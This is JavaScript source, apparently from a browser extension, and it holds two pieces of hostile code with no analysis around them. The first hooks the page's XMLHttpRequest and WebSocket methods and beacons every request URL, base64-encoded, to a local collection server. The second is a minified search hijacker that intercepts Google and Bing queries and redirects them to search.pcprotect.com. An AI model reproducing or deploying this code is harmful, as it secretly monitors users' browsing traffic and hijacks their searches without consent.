function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var interceptAndRedirect=function(){var e={api:utils().getExtensionApi(),settings:{tld:["com","com.au","co.uk"],interceptUrls:[],browsers:["chrome","opera","firefox","edge","ie"],host:"https://search.pcprotect.com",indicator_param:"addon=chrome",redirect_params:"/search/web?fcoid=417&fcop=topnav&fpid=27&q=",enabled:!1},init:function(){e.populateFilterArray(),e.isEnabled(),e.startListeners()},populateFilterArray:function(){$.each(e.settings.tld,function(t,r){for(var s=0;s<=e.settings.browsers.length;s++)e.settings.interceptUrls.push("*://www.google."+r+"/*client="+e.settings.browsers[s]+"*"),e.settings.interceptUrls.push("*://www.google."+r+"/*sourceid="+e.settings.browsers[s]+"*");e.settings.interceptUrls.push("*://www.google."+r+"/webhp*sourceid=chrome-instant*"),e.settings.interceptUrls.push("*://www.bing."+r+"/search?q=*&PC=*"),e.settings.interceptUrls.push("*://www.bing."+r+"/search?FORM=U344DF&PC=U344&q=*"),e.settings.interceptUrls.push("*://www.bing."+r+"/search?FORM=*&q=*")})},isEnabled:function(t,r,s){t&&void 0!==t.status?(e.settings.enabled=t.status,s({response:"success"})):e.api.storage.local.get("search-query-redirect-enabled",function(t){t&&void 0!==t["search-query-redirect-enabled"]&&t["search-query-redirect-enabled"]&&(e.settings.enabled=!0)})},startListeners:function(){e.api.runtime.onMessage.addListener(function(t,r,s){e.isEnabled(t,r,s)}),e.api.webRequest.onBeforeRequest.addListener(function(t){return e.redirect(t)},{urls:e.settings.interceptUrls},["blocking"])},redirect:function(t){if(e.settings.enabled){var r=/(\/search.*[\?&]q\=([^&]+))/,s=t.url.match(r),n=e.settings.host+e.settings.redirect_params;if(s&&s[2])return{redirectUrl:n+s[2]+"&"+e.settings.indicator_param};var i=/\#q\=([^&]+)/;if((s=t.url.match(i))&&s[1])return{redirectUrl:n+s[1]+"&"+e.settings.indicator_param};if("/_generated_background_page.html"===window.location.pathname&&(t.url.match(/(google\.)(.*?)\/webhp/)||t.url.match(/google\.[\w]+\/webhp/)))return{cancel:!0}}}};return e.init(),e}();